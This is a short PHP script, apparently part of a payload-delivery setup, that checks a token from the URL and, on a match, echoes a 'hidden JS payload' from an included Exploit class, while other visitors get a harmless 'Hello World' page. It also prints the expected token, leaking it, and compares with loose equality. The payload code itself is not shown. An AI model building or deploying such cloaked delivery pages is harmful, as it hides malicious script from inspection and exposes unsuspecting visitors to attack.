<?php 

include_once 'controls/utilities/token.class.php';
include_once 'controls/utilities/exploits.class.php';

$token = $_GET['token'];

$t = new Token();
$t = $t->get_token();

printf("%d", $t);

if ($token == $t) {
	echo Exploit::get_hidden_js_payload();
} else {
	echo "<html><body> Hello World</body></html>";
}
?>